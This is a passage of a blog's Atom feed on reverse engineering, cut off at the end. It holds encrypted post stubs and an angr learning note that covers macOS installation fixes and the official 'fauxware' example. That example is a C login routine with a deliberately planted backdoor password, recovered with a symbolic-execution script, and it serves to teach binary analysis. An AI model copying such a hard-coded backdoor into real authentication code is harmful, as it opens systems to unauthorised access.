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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="re" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/re/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
      <category term="ollvm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/ollvm/"/>
    
  </entry>
  
  <entry>
    <title>再谈arm指令编码</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/15/arm-instruction-encode/arm-instruction-encode/</id>
    <published>2019-04-15T06:42:12.000Z</published>
    <updated>2019-04-29T11:59:18.079Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="arm" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/arm/"/>
    
  </entry>
  
  <entry>
    <title>angr learning note</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/03/angr-learning-note/angr-learning-note/</id>
    <published>2019-04-03T06:29:25.000Z</published>
    <updated>2019-04-19T11:33:50.615Z</updated>
    
    <content type="html"><![CDATA[<h3 id="angr学习笔记"><a href="#angr学习笔记" class="headerlink" title="angr学习笔记"></a>angr学习笔记</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>macOS平台上面安装angr的时候还是折腾了一会，刚开始网上都说angr对python3不兼容，然后用python2去安装，但是<code>pip install angr</code>却有问题，然后看官方的文档才发现angr现在主要支持python3，python2不再支持了，反正最新版的angr安装不了(virtualenv需要python3)，要用python2的话，可以安装以前版本的。</p><blockquote><p>It is built for Python 3: Python 2 support is not feasable due to the looming EOL and the small size of our team.</p></blockquote><p>既然官方都这么说了，没理由不安装python3版本的，<code>pip3 install angr</code>一把梭吧。然后又报错了</p><pre><code class="bash">SystemExit: error: [Errno 2] No such file or directory: &#39;libunicorn.dylib&#39;</code></pre><p>明显是在安装unicorn的时候没安装成功，导致找不到其动态库。angr文档中也提及到了这个问题</p><blockquote><p>Building <code>unicorn</code> from source requires Python 2, so will fail inside a virtualenv where <code>python</code> gets you Python 3. If you encounter errors with <code>pip install angr</code>, you may need to first install <code>unicorn</code> separately, pointing it to your Python 2: <code>UNICORN_QEMU_FLAGS=&quot;--python=/path/to/python2&quot; pip install unicorn  # Python 2 is probably /usr/bin/python on your macOS system</code></p></blockquote><p>意思是unicorn兼容python2的，我本机之前已经安装了python2的unicorn，按照文档做还是不行，既然angr依赖unicorn，不如手动安装python3的unicorn。去unicorn的项目中发现可以绑定python3。</p><pre><code class="bash">$ cd bindings/python$ sudo make install3$ python3 -c &quot;import unicorn; print(unicorn.__version__)&quot;1.0.0</code></pre><p>通过这样，我的python3环境中也安装了unicorn。这时候再执行<code>pip3 install angr</code>这下一路畅通，安装完成。</p><p>迫不及待尝试导入angr试下，结果又报错了</p><pre><code>angr.state_plugins.unicorn_engine | failed loading &quot;angr_native.dylib&quot;, unicorn support disabled (dlopen(/usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib, 6): Library not loaded: libpyvex.dylib  Referenced from: /usr/local/lib/python3.7/site-packages/angr/lib/angr_native.dylib  Reason: image not found)</code></pre><p>这个错误很明显，就是<code>angr_native.dylib</code>中加载<code>libpyvex.dylib</code>的时候找不到该动态库。看了下<code>angr_native.dylib</code>的macho格式里load command中加载<code>libpyvex.dylib</code>部分，发现是在其当前目录下去查找<code>libpyvex.dylib</code>和<code>libunicorn.1.dylib</code>。关于这个问题其实官方文档中也提及到这个问题</p><pre><code class="bash">PYVEX=`python3 -c &#39;import pyvex; print(pyvex.__path__[0])&#39;`UNICORN=`python3 -c &#39;import unicorn; print(unicorn.__path__[0])&#39;`ANGR=`python3 -c &#39;import angr; print(angr.__path__[0])&#39;`install_name_tool -change libunicorn.1.dylib &quot;$UNICORN&quot;/lib/libunicorn.dylib &quot;$ANGR&quot;/lib/angr_native.dylibinstall_name_tool -change libpyvex.dylib &quot;$PYVEX&quot;/lib/libpyvex.dylib &quot;$ANGR&quot;/lib/angr_native.dylib</code></pre><p>就是通过重新指定加载<code>libunicorn.dylib</code>和<code>libpyvex.dylib</code> 的位置。执行完脚本以后，angr算是安装完成了。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><p>直接上例子来学习，官方的fauxware例子</p><p>C源码如下</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;char *sneaky = &quot;SOSNEAKY&quot;;int authenticate(char *username, char *password){    char stored_pw[9];    stored_pw[8] = 0;    int pwfile;    // evil back d00r    if (strcmp(password, sneaky) == 0) return 1;    pwfile = open(username, O_RDONLY);    read(pwfile, stored_pw, 8);    if (strcmp(password, stored_pw) == 0) return 1;    return 0;}int accepted(){    printf(&quot;Welcome to the admin console, trusted user!\n&quot;);}int rejected(){    printf(&quot;Go away!&quot;);    exit(1);}int main(int argc, char **argv){    char username[9];    char password[9];    int authed;    username[8] = 0;    password[8] = 0;    printf(&quot;Username: \n&quot;);    read(0, username, 8);    read(0, &amp;authed, 1);    printf(&quot;Password: \n&quot;);    read(0, password, 8);    read(0, &amp;authed, 1);    authed = authenticate(username, password);    if (authed) accepted();    else rejected();}</code></pre><p>简单解释下程序就是程序有一个后门，当输入的password为SOSNEAKY即可通过。下面我们用angr来求解出成功的输入</p><pre><code class="python">import angrfilename = &#39;the/filepath/of/fauxware&#39;proj = angr.Project(filename, auto_load_libs=False)st = proj.factory.entry_state()while True:    succ = st.step()    if len(succ.successors) == 2:        break    st = succ.successors[0]st1, st2 = succ.successorsprint(st1, st2)print(st1.posix.dumps(0))print(st2.posix.dumps(0))</code></pre><p>下面解释下这个python代码</p><p><code>proj = angr.Project(filename, auto_load_libs=False)</code>加载一个二进制文件，然后得到一个程序开始处的状态<code>st = proj.factory.entry_state()</code>下面从这个状态开始，一直运行直到出现分支。最后获取此时的两个状态。打印出满足条件的输入值。</p><pre><code>&lt;SimState @ 0x400692&gt; &lt;SimState @ 0x400699&gt;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00SOSNEAKY\x00&#39;b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00S\x80\x80\x80@\x80\x80\x00\x00&#39;</code></pre><p>可以看出st1也就是成功授权的输入为SOSNEAKY。</p><h4 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h4><h5 id="factory"><a href="#factory" class="headerlink" title="factory"></a>factory</h5><p>该对象提供了大多数的功能，能够将二进制对象分解为很方便处理的对象。</p><ul><li><p>blocks</p><p><code>project.factory.block()</code>给定一个地址，返回其basic block，这里的block与llvm中的block一致。获取了block就能进一步对其指令等操作。</p><pre><code class="python">block = proj.factory.block(proj.entry)block.pp() # 打印block反汇编代码block.instructions # 指令个数block.instruction_addrs # 指令地址list</code></pre></li><li><p>states</p><p>angr里面很重要的一个对象，代表了程序的一个实例镜像，是模拟执行某个时刻的状态。</p><pre><code class="python">state = proj.factory.entry_state()&lt;SimState @ 0x401670&gt;</code></pre><p>既然是程序模拟运行过程中的某个状态，那么SimState就包含了程序内存，寄存器，文件系统等数据。而且这些数据是可以被修改。</p><pre><code class="python"># 访问寄存器和内存&gt;&gt;&gt; state.regs.rip        # get the current instruction pointer&lt;BV64 0x401670&gt;&gt;&gt;&gt; state.regs.rax&lt;BV64 0x1c&gt;&gt;&gt;&gt; state.mem[proj.entry].int.resolved  # interpret the memory at the entry point as a C int&lt;BV32 0x8949ed31&gt;# 修改寄存器和内存&gt;&gt;&gt; state.regs.rsi = state.solver.BVV(3, 64)&gt;&gt;&gt; state.regs.rsi&lt;BV64 0x3&gt;&gt;&gt;&gt; state.mem[0x1000].long = 4&gt;&gt;&gt; state.mem[0x1000].long.resolved&lt;BV64 0x4&gt;</code></pre><p>这些数据都是bitvectors，所以需要一个转换</p><pre><code class="python">&gt;&gt;&gt; bv = state.solver.BVV(0x1234, 32)       # create a 32-bit-wide bitvector with value 0x1234&lt;BV32 0x1234&gt;                               # BVV stands for bitvector value&gt;&gt;&gt; state.solver.eval(bv)                # convert to python int0x1234</code></pre><p><code>mem</code>有几点需要注意：</p><ul><li><code>.type</code>有<code>char, short, int, long, size_t, uint8_t, uint16_t</code>等</li><li><code>.resolved</code>得到bitvector；<code>.concrete</code>得到int值</li></ul></li><li><p>simulation managers</p><p>state代表了某个时刻的程序状态，那么simulation managers就代表了程序如何进入下一个state。</p><pre><code class="python">&gt;&gt;&gt; simgr = proj.factory.simulation_manager(state)&lt;SimulationManager with 1 active&gt;&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x401670&gt;]</code></pre><p>这里我们用state去初始化了simulation managers得到了一组state。<code>.active</code>返回当前state。</p><pre><code class="python">&gt;&gt;&gt; simgr.step()&gt;&gt;&gt; simgr.active[&lt;SimState @ 0x1020300&gt;]&gt;&gt;&gt; simgr.active[0].regs.rip                 # new and exciting!&lt;BV64 0x1020300&gt;&gt;&gt;&gt; state.regs.rip                           # still the same!&lt;BV64 0x401670&gt;</code></pre><p>通过上面的方法去执行程序，这样会得到下一个state，此时active的state已经变了，step方法会执行到下一个basic block。之前的state仍然保留不变。</p></li></ul><h4 id="待更新"><a href="#待更新" class="headerlink" title="待更新"></a>待更新</h4><p>…</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://docs.angr.io/core-concepts/" target="_blank" rel="external">https://docs.angr.io/core-concepts/</a></li><li><a href="https://www.secpulse.com/archives/83197.html" target="_blank" rel="external">https://www.secpulse.com/archives/83197.html</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;angr学习笔记&quot;&gt;&lt;a href=&quot;#angr学习笔记&quot; class=&quot;headerlink&quot; title=&quot;angr学习笔记&quot;&gt;&lt;/a&gt;angr学习笔记&lt;/h3&gt;&lt;h4 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; titl
      
    
    </summary>
    
      <category term="note" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/note/"/>
    
    
      <category term="angr" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/angr/"/>
    
  </entry>
  
  <entry>
    <title>applepie writeup分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/02/applepie/applepie/</id>
    <published>2019-04-02T06:02:40.000Z</published>
    <updated>2019-04-30T04:08:21.329Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!" />    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none"></div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>源码解读macOS/iOS Heap</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3macos-heap/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/04/01/深入理解macos-heap/深入理解macos-heap/</id>
    <published>2019-04-01T07:30:31.000Z</published>
    <updated>2019-04-02T05:50:15.199Z</updated>
    
